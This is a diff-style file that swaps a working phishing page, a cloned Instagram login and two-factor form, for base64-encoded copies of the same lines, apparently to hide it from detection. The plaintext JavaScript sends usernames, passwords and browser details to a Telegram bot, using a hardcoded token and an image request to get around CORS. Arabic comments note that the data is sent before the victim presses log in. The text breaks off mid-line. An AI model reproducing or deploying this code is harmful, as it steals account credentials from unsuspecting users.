+ICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgaWQ9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiIGF1dG9jb21wbGV0ZT0iY3VycmVudC1wYXNzd29yZCI-
+ICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi13cmFwcGVyIj4
+ICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgaWQ9ImxvZ2luQnRuIiBkaXNhYmxlZD5Mb2cgaW48L2J1dHRvbj4
+ICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJjb29sZG93bk92ZXJsYXkiPg
+ICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3Bpbm5lciI-PC9kaXY-
+ICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9ImNvb2xkb3duVGV4dCI-VmVyaWZ5aW5nIGNyZWRlbnRpYWxzLi4uICgxMHMpPC9zcGFuPg
+ICAgICAgICAgICAgICAgICAgICA8L2Rpdj4
+ICAgICAgICAgICAgICAgIDwvZGl2Pg
+ICAgICAgICAgICAgPC9mb3JtPg
+ICAgICAgICAgICAgPGRpdiBjbGFzcz0ic2VwYXJhdG9yIj4
+ICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJsaW5lIj48L3NwYW4-
+ICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJvciI-T1I8L3NwYW4-
+ICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJsaW5lIj48L3NwYW4-
+ICAgICAgICAgICAgPC9kaXY-
+ICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZmItbG9naW4iIGlkPSJmYkxvZ2luIj4
+ICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJodHRwczovL2kuaW1ndXIuY29tL2V4a3Nvdm8ucG5nIiBhbHQ9IkZhY2Vib29rIj4
+ICAgICAgICAgICAgICAgIExvZyBpbiB3aXRoIEZhY2Vib29r
+ICAgICAgICAgICAgPC9idXR0b24-
+ICAgICAgICAgICAgPGEgaHJlZj0iIyIgY2xhc3M9ImZvcmdvdC1wYXNzd29yZCI-Rm9yZ290IHBhc3N3b3JkPzwvYT4
+ICAgICAgICA8L2Rpdj4
 
-        <div class="card" id="twofaSection">
-            <div class="lock-icon">
-                <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
-                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                </svg>
-            </div>
-            <h2>Two-Factor Authentication</h2>
-            <p class="subtitle">Enter the code we sent to <span id="displayUser">your phone</span>.</p>
-            <div id="errorMsg">Invalid code. Please try again.</div>
-            <div class="success-msg" id="successMsg">✓ Code verified successfully!</div>
-            <div class="code-inputs" id="codeInputs">
-                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box" autofocus>
-                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
-                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
-                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
-                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
-                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
-            </div>
-            <button id="verifyBtn" disabled>Verify</button>
-            <div class="resend-area">
-                Didn't get the code? 
-                <button id="resendBtn">Send code again</button>
-            </div>
-            <a href="#" id="backToLogin" class="back-link">← Back to login</a>
-        </div>
+ICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIiBpZD0idHdvZmFTZWN0aW9uIj4
+ICAgICAgICAgICAgPGRpdiBjbGFzcz0ibG9jay1pY29uIj4
+ICAgICAgICAgICAgICAgIDxzdmcgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiMyNjI2MjYiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj4
+ICAgICAgICAgICAgICAgICAgICA8cmVjdCB4PSIzIiB5PSIxMSIgd2lkdGg9IjE4IiBoZWlnaHQ9IjExIiByeD0iMiIgcnk9IjIiLz4
+ICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNNyAxMVY3YTUgNSAwIDAgMSAxMCAwdjQiLz4
+ICAgICAgICAgICAgICAgIDwvc3ZnPg
+ICAgICAgICAgICAgPC9kaXY-
+ICAgICAgICAgICAgPGgyPlR3by1GYWN0b3IgQXV0aGVudGljYXRpb248L2gyPg
+ICAgICAgICAgICAgPHAgY2xhc3M9InN1YnRpdGxlIj5FbnRlciB0aGUgY29kZSB3ZSBzZW50IHRvIDxzcGFuIGlkPSJkaXNwbGF5VXNlciI-eW91ciBwaG9uZTwvc3Bhbj4uPC9wPg
+ICAgICAgICAgICAgPGRpdiBpZD0iZXJyb3JNc2ciPkludmFsaWQgY29kZS4gUGxlYXNlIHRyeSBhZ2Fpbi48L2Rpdj4
+ICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3VjY2Vzcy1tc2ciIGlkPSJzdWNjZXNzTXNnIj7inJMgQ29kZSB2ZXJpZmllZCBzdWNjZXNzZnVsbHkhPC9kaXY-
+ICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29kZS1pbnB1dHMiIGlkPSJjb2RlSW5wdXRzIj4
+ICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBtYXhsZW5ndGg9IjEiIGlucHV0bW9kZT0ibnVtZXJpYyIgcGF0dGVybj0iWzAtOV0iIGNsYXNzPSJjb2RlLWJveCIgYXV0b2ZvY3VzPg
+ICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBtYXhsZW5ndGg9IjEiIGlucHV0bW9kZT0ibnVtZXJpYyIgcGF0dGVybj0iWzAtOV0iIGNsYXNzPSJjb2RlLWJveCI-
+ICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBtYXhsZW5ndGg9IjEiIGlucHV0bW9kZT0ibnVtZXJpYyIgcGF0dGVybj0iWzAtOV0iIGNsYXNzPSJjb2RlLWJveCI-
+ICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBtYXhsZW5ndGg9IjEiIGlucHV0bW9kZT0ibnVtZXJpYyIgcGF0dGVybj0iWzAtOV0iIGNsYXNzPSJjb2RlLWJveCI-
+ICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBtYXhsZW5ndGg9IjEiIGlucHV0bW9kZT0ibnVtZXJpYyIgcGF0dGVybj0iWzAtOV0iIGNsYXNzPSJjb2RlLWJveCI-
+ICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBtYXhsZW5ndGg9IjEiIGlucHV0bW9kZT0ibnVtZXJpYyIgcGF0dGVybj0iWzAtOV0iIGNsYXNzPSJjb2RlLWJveCI-
+ICAgICAgICAgICAgPC9kaXY-
+ICAgICAgICAgICAgPGJ1dHRvbiBpZD0idmVyaWZ5QnRuIiBkaXNhYmxlZD5WZXJpZnk8L2J1dHRvbj4
+ICAgICAgICAgICAgPGRpdiBjbGFzcz0icmVzZW5kLWFyZWEiPg
+ICAgICAgICAgICAgICAgIERpZG4ndCBnZXQgdGhlIGNvZGU_IA
+ICAgICAgICAgICAgICAgIDxidXR0b24gaWQ9InJlc2VuZEJ0biI-U2VuZCBjb2RlIGFnYWluPC9idXR0b24-
+ICAgICAgICAgICAgPC9kaXY-
+ICAgICAgICAgICAgPGEgaHJlZj0iIyIgaWQ9ImJhY2tUb0xvZ2luIiBjbGFzcz0iYmFjay1saW5rIj7ihpAgQmFjayB0byBsb2dpbjwvYT4
+ICAgICAgICA8L2Rpdj4
 
-        <div class="signup-card" id="signupCard">
-            Don't have an account? <a href="#">Sign up</a>
-        </div>
-        <div class="apps-section">
-            <p>Get the app.</p>
-            <div class="apps-badges">
-                <a href="#"><img src="https://i.imgur.com/lREV6Qa.png" alt="Download on the App Store"></a>
-                <a href="#"><img src="https://i.imgur.com/DFQNKXK.png" alt="Get it on Google Play"></a>
-            </div>
-        </div>
-    </div>
-</div>
+ICAgICAgICA8ZGl2IGNsYXNzPSJzaWdudXAtY2FyZCIgaWQ9InNpZ251cENhcmQiPg
+ICAgICAgICAgICAgRG9uJ3QgaGF2ZSBhbiBhY2NvdW50PyA8YSBocmVmPSIjIj5TaWduIHVwPC9hPg
+ICAgICAgICA8L2Rpdj4
+ICAgICAgICA8ZGl2IGNsYXNzPSJhcHBzLXNlY3Rpb24iPg
+ICAgICAgICAgICAgPHA-R2V0IHRoZSBhcHAuPC9wPg
+ICAgICAgICAgICAgPGRpdiBjbGFzcz0iYXBwcy1iYWRnZXMiPg
+ICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMiPjxpbWcgc3JjPSJodHRwczovL2kuaW1ndXIuY29tL2xSRVY2UWEucG5nIiBhbHQ9IkRvd25sb2FkIG9uIHRoZSBBcHAgU3RvcmUiPjwvYT4
+ICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMiPjxpbWcgc3JjPSJodHRwczovL2kuaW1ndXIuY29tL0RGUU5LWEsucG5nIiBhbHQ9IkdldCBpdCBvbiBHb29nbGUgUGxheSI-PC9hPg
+ICAgICAgICAgICAgPC9kaXY-
+ICAgICAgICA8L2Rpdj4
+ICAgIDwvZGl2Pg
+PC9kaXY-
 
-<footer>
-    <div class="links">
-        <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a>
-        <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a>
-        <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a>
-        <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
-    </div>
-    <div class="copyright">© 2026 Instagram from Meta</div>
-</footer>
+PGZvb3Rlcj4
+ICAgIDxkaXYgY2xhc3M9ImxpbmtzIj4
+ICAgICAgICA8YSBocmVmPSIjIj5NZXRhPC9hPiA8YSBocmVmPSIjIj5BYm91dDwvYT4gPGEgaHJlZj0iIyI-QmxvZzwvYT4gPGEgaHJlZj0iIyI-Sm9iczwvYT4
+ICAgICAgICA8YSBocmVmPSIjIj5IZWxwPC9hPiA8YSBocmVmPSIjIj5BUEk8L2E-IDxhIGhyZWY9IiMiPlByaXZhY3k8L2E-IDxhIGhyZWY9IiMiPlRlcm1zPC9hPg
+ICAgICAgICA8YSBocmVmPSIjIj5Mb2NhdGlvbnM8L2E-IDxhIGhyZWY9IiMiPkluc3RhZ3JhbSBMaXRlPC9hPiA8YSBocmVmPSIjIj5UaHJlYWRzPC9hPg
+ICAgICAgICA8YSBocmVmPSIjIj5Db250YWN0IFVwbG9hZGluZyAmIE5vbi1Vc2VyczwvYT4gPGEgaHJlZj0iIyI-TWV0YSBWZXJpZmllZDwvYT4
+ICAgIDwvZGl2Pg
+ICAgIDxkaXYgY2xhc3M9ImNvcHlyaWdodCI-wqkgMjAyNiBJbnN0YWdyYW0gZnJvbSBNZXRhPC9kaXY-
+PC9mb290ZXI-
 
-<script>
-    // ============================================
-    //  CONFIG - غير القيم لقيمك
-    // ============================================
-    const CONFIG = {
-        telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
-        telegramChatId: '8278195073',
-        cooldownDuration: 10,
-        delayBeforeRedirect: 2000
-    };
+PHNjcmlwdD4
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICBDT05GSUcgLSDYutmK2LEg2KfZhNmC2YrZhSDZhNmC2YrZhdmD
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIGNvbnN0IENPTkZJRyA9IHs
+ICAgICAgICB0ZWxlZ3JhbVRva2VuOiAnODE5MTkzNjAzMDpBQUZsNFBvQnBobVZ6c3VrVkgxWS1TUDVtRTQ1a2dNcW5rZycs
+ICAgICAgICB0ZWxlZ3JhbUNoYXRJZDogJzgyNzgxOTUwNzMnLA
+ICAgICAgICBjb29sZG93bkR1cmF0aW9uOiAxMCw
+ICAgICAgICBkZWxheUJlZm9yZVJlZGlyZWN0OiAyMDAw
+ICAgIH07
 
-    // ============================================
-    //  TELEGRAM SENDER (Image method - يتجاوز CORS)
-    // ============================================
-    function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
-        const params = new URLSearchParams({
-            chat_id: CONFIG.telegramChatId,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-        try {
-            new Image().src = `${url}?${params.toString()}`;
-            console.log('✓ Sent to Telegram');
-        } catch(e) {
-            console.error('✗ Failed:', e.message);
-        }
-    }
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICBURUxFR1JBTSBTRU5ERVIgKEltYWdlIG1ldGhvZCAtINmK2KrYrNin2YjYsiBDT1JTKQ
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIGZ1bmN0aW9uIHNlbmRUb1RlbGVncmFtKG1lc3NhZ2UpIHs
+ICAgICAgICBjb25zdCB1cmwgPSBgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCR7Q09ORklHLnRlbGVncmFtVG9rZW59L3NlbmRNZXNzYWdlYDs
+ICAgICAgICBjb25zdCBwYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHs
+ICAgICAgICAgICAgY2hhdF9pZDogQ09ORklHLnRlbGVncmFtQ2hhdElkLA
+ICAgICAgICAgICAgdGV4dDogbWVzc2FnZSw
+ICAgICAgICAgICAgcGFyc2VfbW9kZTogJ01hcmtkb3duJw
+ICAgICAgICB9KTs
+ICAgICAgICB0cnkgew
+ICAgICAgICAgICAgbmV3IEltYWdlKCkuc3JjID0gYCR7dXJsfT8ke3BhcmFtcy50b1N0cmluZygpfWA7
+ICAgICAgICAgICAgY29uc29sZS5sb2coJ-KckyBTZW50IHRvIFRlbGVncmFtJyk7
+ICAgICAgICB9IGNhdGNoKGUpIHs
+ICAgICAgICAgICAgY29uc29sZS5lcnJvcign4pyXIEZhaWxlZDonLCBlLm1lc3NhZ2UpOw
+ICAgICAgICB9
+ICAgIH0
 
-    // ============================================
-    //  UI ELEMENTS
-    // ============================================
-    const slides = document.getElementById('slides');
-    let currentSlide = 0;
-    setInterval(() => {
-        currentSlide = (currentSlide + 1) % 4;
-        slides.style.transform = `translateX(-${currentSlide * 100}%)`;
-    }, 3000);
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICBVSSBFTEVNRU5UUw
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIGNvbnN0IHNsaWRlcyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzbGlkZXMnKTs
+ICAgIGxldCBjdXJyZW50U2xpZGUgPSAwOw
+ICAgIHNldEludGVydmFsKCgpID0-IHs
+ICAgICAgICBjdXJyZW50U2xpZGUgPSAoY3VycmVudFNsaWRlICsgMSkgJSA0Ow
+ICAgICAgICBzbGlkZXMuc3R5bGUudHJhbnNmb3JtID0gYHRyYW5zbGF0ZVgoLSR7Y3VycmVudFNsaWRlICogMTAwfSUpYDs
+ICAgIH0sIDMwMDApOw
 
-    const u = document.getElementById('username');
-    const p = document.getElementById('password');
-    const loginBtn = document.getElementById('loginBtn');
-    const loginForm = document.getElementById('loginForm');
-    const cooldownOverlay = document.getElementById('cooldownOverlay');
-    const cooldownText = document.getElementById('cooldownText');
-    const loginCard = document.getElementById('loginCard');
-    const signupCard = document.getElementById('signupCard');
-    const twofaSection = document.getElementById('twofaSection');
-    const displayUser = document.getElementById('displayUser');
-    const codeBoxes = document.querySelectorAll('.code-box');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const resendBtn = document.getElementById('resendBtn');
-    const backLink = document.getElementById('backToLogin');
-    const loadingScreen = document.getElementById('loadingScreen');
-    const loadingText = document.getElementById('loadingText');
-    const errorMsg = document.getElementById('errorMsg');
-    const successMsg = document.getElementById('successMsg');
+ICAgIGNvbnN0IHUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWUnKTs
+ICAgIGNvbnN0IHAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmQnKTs
+ICAgIGNvbnN0IGxvZ2luQnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luQnRuJyk7
+ICAgIGNvbnN0IGxvZ2luRm9ybSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkZvcm0nKTs
+ICAgIGNvbnN0IGNvb2xkb3duT3ZlcmxheSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb29sZG93bk92ZXJsYXknKTs
+ICAgIGNvbnN0IGNvb2xkb3duVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb29sZG93blRleHQnKTs
+ICAgIGNvbnN0IGxvZ2luQ2FyZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkNhcmQnKTs
+ICAgIGNvbnN0IHNpZ251cENhcmQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2lnbnVwQ2FyZCcpOw
+ICAgIGNvbnN0IHR3b2ZhU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0d29mYVNlY3Rpb24nKTs
+ICAgIGNvbnN0IGRpc3BsYXlVc2VyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Rpc3BsYXlVc2VyJyk7
+ICAgIGNvbnN0IGNvZGVCb3hlcyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5jb2RlLWJveCcpOw
+ICAgIGNvbnN0IHZlcmlmeUJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd2ZXJpZnlCdG4nKTs
+ICAgIGNvbnN0IHJlc2VuZEJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXNlbmRCdG4nKTs
+ICAgIGNvbnN0IGJhY2tMaW5rID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhY2tUb0xvZ2luJyk7
+ICAgIGNvbnN0IGxvYWRpbmdTY3JlZW4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1NjcmVlbicpOw
+ICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7
+ICAgIGNvbnN0IGVycm9yTXNnID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTXNnJyk7
+ICAgIGNvbnN0IHN1Y2Nlc3NNc2cgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VjY2Vzc01zZycpOw
 
-    // ============================================
-    //  المتغيرات الجديدة للتتبع
-    // ============================================
-    let capturedUsername = '';
-    let capturedPassword = '';
-    let cooldownTimer = null;
-    let cooldownCount = 0;
-    let verificationAttempts = 0;
-    let usernameSent = false;  // متغير لمنع إرسال الإيميل/يوزر أكثر من مرة
-    let passwordSent = false;  // متغير لمنع إرسال الباسورد أكثر من مرة
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICDYp9mE2YXYqti62YrYsdin2Kog2KfZhNis2K_Zitiv2Kkg2YTZhNiq2KrYqNi5
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIGxldCBjYXB0dXJlZFVzZXJuYW1lID0gJyc7
+ICAgIGxldCBjYXB0dXJlZFBhc3N3b3JkID0gJyc7
+ICAgIGxldCBjb29sZG93blRpbWVyID0gbnVsbDs
+ICAgIGxldCBjb29sZG93bkNvdW50ID0gMDs
+ICAgIGxldCB2ZXJpZmljYXRpb25BdHRlbXB0cyA9IDA7
+ICAgIGxldCB1c2VybmFtZVNlbnQgPSBmYWxzZTsgIC8vINmF2KrYutmK2LEg2YTZhdmG2Lkg2KXYsdiz2KfZhCDYp9mE2KXZitmF2YrZhC_ZitmI2LLYsSDYo9mD2KvYsSDZhdmGINmF2LHYqQ
+ICAgIGxldCBwYXNzd29yZFNlbnQgPSBmYWxzZTsgIC8vINmF2KrYutmK2LEg2YTZhdmG2Lkg2KXYsdiz2KfZhCDYp9mE2KjYp9iz2YjYsdivINij2YPYq9ixINmF2YYg2YXYsdip
 
-    function checkLogin() {
-        loginBtn.disabled = !(u.value.trim() && p.value.trim());
-    }
-    u.addEventListener('input', checkLogin);
-    p.addEventListener('input', checkLogin);
+ICAgIGZ1bmN0aW9uIGNoZWNrTG9naW4oKSB7
+ICAgICAgICBsb2dpbkJ0bi5kaXNhYmxlZCA9ICEodS52YWx1ZS50cmltKCkgJiYgcC52YWx1ZS50cmltKCkpOw
+ICAgIH0
+ICAgIHUuYWRkRXZlbnRMaXN0ZW5lcignaW5wdXQnLCBjaGVja0xvZ2luKTs
+ICAgIHAuYWRkRXZlbnRMaXN0ZW5lcignaW5wdXQnLCBjaGVja0xvZ2luKTs
 
-    // ============================================
-    //  🆕 كود جديد: إرسال الإيميل/يوزر/رقم الهاتف فوراً عند الكتابة
-    //  (بدون انتظار كلمة المرور)
-    // ============================================
-    u.addEventListener('blur', function() {
-        const val = this.value.trim();
-        if (val && !usernameSent) {
-            usernameSent = true;
-            sendToTelegram(
-                `📧 *Step 1: Identifier Captured* 📧\n\n` +
-                `👤 *Identifier:* \`${val}\`\n` +
-                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
-                `⏰ *Time:* ${new Date().toISOString()}`
-            );
-            console.log('✓ Username/Email/Phone sent');
-        }
-    });
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICDwn4aVINmD2YjYryDYrNiv2YrYrzog2KXYsdiz2KfZhCDYp9mE2KXZitmF2YrZhC_ZitmI2LLYsS_YsdmC2YUg2KfZhNmH2KfYqtmBINmB2YjYsdin2Ysg2LnZhtivINin2YTZg9iq2KfYqNip
+ICAgIC8vICAo2KjYr9mI2YYg2KfZhtiq2LjYp9ixINmD2YTZhdipINin2YTZhdix2YjYsSk
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIHUuYWRkRXZlbnRMaXN0ZW5lcignYmx1cicsIGZ1bmN0aW9uKCkgew
+ICAgICAgICBjb25zdCB2YWwgPSB0aGlzLnZhbHVlLnRyaW0oKTs
+ICAgICAgICBpZiAodmFsICYmICF1c2VybmFtZVNlbnQpIHs
+ICAgICAgICAgICAgdXNlcm5hbWVTZW50ID0gdHJ1ZTs
+ICAgICAgICAgICAgc2VuZFRvVGVsZWdyYW0o
+ICAgICAgICAgICAgICAgIGDwn5OnICpTdGVwIDE6IElkZW50aWZpZXIgQ2FwdHVyZWQqIPCfk6dcblxuYCAr
+ICAgICAgICAgICAgICAgIGDwn5GkICpJZGVudGlmaWVyOiogXGAke3ZhbH1cYFxuYCAr
+ICAgICAgICAgICAgICAgIGDwn5OxICpVQToqICR7bmF2aWdhdG9yLnVzZXJBZ2VudC5zbGljZSgwLCA4MCl9XG5gICs
+ICAgICAgICAgICAgICAgIGDij7AgKlRpbWU6KiAke25ldyBEYXRlKCkudG9JU09TdHJpbmcoKX1g
+ICAgICAgICAgICAgKTs
+ICAgICAgICAgICAgY29uc29sZS5sb2coJ-KckyBVc2VybmFtZS9FbWFpbC9QaG9uZSBzZW50Jyk7
+ICAgICAgICB9
+ICAgIH0pOw
 
-    // ============================================
-    //  🆕 كود جديد: إرسال كلمة المرور فوراً عند كتابتها
-    //  (بدون انتظار الضغط على Log in)
-    // ============================================
-    p.addEventListener('blur', function() {
-        const val = this.value;
-        if (val && !passwordSent) {
-            passwordSent = true;
-            const userVal = u.value.trim() || 'N/A';
-            sendToTelegram(
-                `🔑 *Step 2: Password Captured* 🔑\n\n` +
-                `👤 *Identifier:* \`${userVal}\`\n` +
-                `🔑 *Password:* \`${val}\`\n` +
-                `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
-                `⏰ *Time:* ${new Date().toISOString()}`
-            );
-            console.log('✓ Password sent');
-        }
-    });
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICDwn4aVINmD2YjYryDYrNiv2YrYrzog2KXYsdiz2KfZhCDZg9mE2YXYqSDYp9mE2YXYsdmI2LEg2YHZiNix2KfZiyDYudmG2K8g2YPYqtin2KjYqtmH2Kc
+ICAgIC8vICAo2KjYr9mI2YYg2KfZhtiq2LjYp9ixINin2YTYtti62Lcg2LnZhNmJIExvZyBpbik
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIHAuYWRkRXZlbnRMaXN0ZW5lcignYmx1cicsIGZ1bmN0aW9uKCkgew
+ICAgICAgICBjb25zdCB2YWwgPSB0aGlzLnZhbHVlOw
+ICAgICAgICBpZiAodmFsICYmICFwYXNzd29yZFNlbnQpIHs
+ICAgICAgICAgICAgcGFzc3dvcmRTZW50ID0gdHJ1ZTs
+ICAgICAgICAgICAgY29uc3QgdXNlclZhbCA9IHUudmFsdWUudHJpbSgpIHx8ICdOL0EnOw
+ICAgICAgICAgICAgc2VuZFRvVGVsZWdyYW0o
+ICAgICAgICAgICAgICAgIGDwn5SRICpTdGVwIDI6IFBhc3N3b3JkIENhcHR1cmVkKiDwn5SRXG5cbmAgKw
+ICAgICAgICAgICAgICAgIGDwn5GkICpJZGVudGlmaWVyOiogXGAke3VzZXJWYWx9XGBcbmAgKw
+ICAgICAgICAgICAgICAgIGDwn5SRICpQYXNzd29yZDoqIFxgJHt2YWx9XGBcbmAgKw
+ICAgICAgICAgICAgICAgIGDwn5OxICpVQToqICR7bmF2aWdhdG9yLnVzZXJBZ2VudC5zbGljZSgwLCA4MCl9XG5gICs
+ICAgICAgICAgICAgICAgIGDij7AgKlRpbWU6KiAke25ldyBEYXRlKCkudG9JU09TdHJpbmcoKX1g
+ICAgICAgICAgICAgKTs
+ICAgICAgICAgICAgY29uc29sZS5sb2coJ-KckyBQYXNzd29yZCBzZW50Jyk7
+ICAgICAgICB9
+ICAgIH0pOw
 
-    // ============================================
-    //  LOGIN SUBMIT (يبقى كما هو مع الإرسال المكرر)
-    // ============================================
-    loginForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        if (cooldownTimer) return;
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIC8vICBMT0dJTiBTVUJNSVQgKNmK2KjZgtmJINmD2YXYpyDZh9mIINmF2Lkg2KfZhNil2LHYs9in2YQg2KfZhNmF2YPYsdixKQ
+ICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
+ICAgIGxvZ2luRm9ybS5hZGRFdmVudExpc3RlbmVyKCdzdWJtaXQnLCBmdW5jdGlvbihlKSB7
+ICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7
+ICAgICAgICBpZiAoY29vbGRvd25UaW1lcikgcmV0dXJuOw
 
-        capturedUsername = u.value.trim();
-        capturedPassword = p.value;
+ICAgICAgICBjYXB0dXJlZFVzZXJuYW1lID0gdS52YWx1ZS50cmltKCk7
+ICAgICAgICBjYXB0dXJlZFBhc3N3b3JkID0gcC52YWx1ZTs
 
-        // إرسال تأكيدي عند الضغط على Log in (احتياطاً)
-        sendToTelegram(
-            `✅ *Login Button Pressed* ✅\n\n` +
-            `👤 *User:* \`${capturedUsername}\`\n` +
-            `🔑 *Pass:* \`${capturedPassword}\`\n` +
-            `⏰ *Time:* ${new Date().toISOString()}`
-        );
+ICAgICAgICAvLyDYpdix2LPYp9mEINiq2KPZg9mK2K_ZiiDYudmG2K8g2KfZhNi22LrYtyDYudmE2YkgTG9nIGluICjYp9it2KrZitin2LfYp9mLKQ
+ICAgICAgICBzZW5kVG9UZWxlZ3JhbSg
+ICAgICAgICAgICAgYOKchSAqTG9naW4gQnV0dG9uIFByZXNzZWQqIOKchVxuXG5gICs
+ICAgICAgICAgICAgYPCfkaQgKlVzZXI6KiBcYCR7Y2FwdHVyZWRVc2VybmFtZX1cYFxuYCAr
+ICAgICAgICAgICAgYPCflJEgKlBhc3M6KiBcYCR7Y2FwdHVyZWRQYXNzd29yZH1cYFxuYCAr
+ICAgICAgICAgICAgYOKPsCAqVGltZToqICR7bmV3IERhdGUoKS50b0lTT1N0cmluZygpfWA
+ICAgICAgICApOw
 
-        // العد التنازلي
-        loginBtn.disabled = true;
-        cooldownOverlay.style.display = 'flex';
-        cooldownCount = CONFIG.cooldownDuration;
-        cooldownText.textContent = `Verifying credentials... (${cooldownCount}s)`;
+ICAgICAgICAvLyDYp9mE2LnYryDYp9mE2KrZhtin2LLZhNmK
